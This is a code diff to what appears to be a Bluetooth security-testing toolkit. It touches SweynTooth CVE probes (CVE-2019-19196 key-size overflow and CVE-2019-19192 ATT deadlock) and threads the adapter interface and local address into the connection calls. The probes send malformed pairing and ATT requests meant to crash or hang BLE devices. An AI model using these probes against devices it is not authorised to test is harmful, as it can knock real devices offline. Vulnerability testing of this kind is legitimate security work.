@@ -9,13 +9,14 @@ from blue_tap.attack.cve_checks_ble_smp import _connect_ble_smp
 from blue_tap.fuzz.protocols.att import build_exchange_mtu_req
 from blue_tap.fuzz.protocols.smp import build_pairing_request
 from blue_tap.fuzz.transport import BLETransport
+from blue_tap.utils.bt_helpers import get_adapter_address
 
 
 def sweyntooth_key_size_overflow(address: str, hci: str = "hci0",
                                  max_key_size: int = 253) -> dict[str, Any]:
     """CVE-2019-19196 Variant B: malformed SMP Pairing Request key-size trigger."""
     start = time.time()
-    sock = _connect_ble_smp(address, timeout=8.0)
+    sock = _connect_ble_smp(address, timeout=8.0, hci=hci)
     if sock is None:
         return {
             "target": address,
@@ -85,7 +86,13 @@ def sweyntooth_att_deadlock(address: str, hci: str = "hci0",
     """CVE-2019-19192 sequential ATT request deadlock probe."""
     start = time.time()
     address_type = BLETransport._detect_address_type(address)
-    transport = BLETransport(address, cid=BLETransport.ATT_CID, address_type=address_type, timeout=4.0)
+    transport = BLETransport(
+        address,
+        cid=BLETransport.ATT_CID,
+        address_type=address_type,
+        local_address=get_adapter_address(hci) or "00:00:00:00:00:00",
+        timeout=4.0,
+    )
     first_sent = 0
 
     try:
@@ -110,7 +117,13 @@ def sweyntooth_att_deadlock(address: str, hci: str = "hci0",
         transport.close()
         time.sleep(max(settle_seconds, 0.0))
 
-        verify = BLETransport(address, cid=BLETransport.ATT_CID, address_type=address_type, timeout=4.0)
+        verify = BLETransport(
+            address,
+            cid=BLETransport.ATT_CID,
+            address_type=address_type,
+            local_address=get_adapter_address(hci) or "00:00:00:00:00:00",
+            timeout=4.0,
+        )
         try:
             if not verify.connect():
                 return {
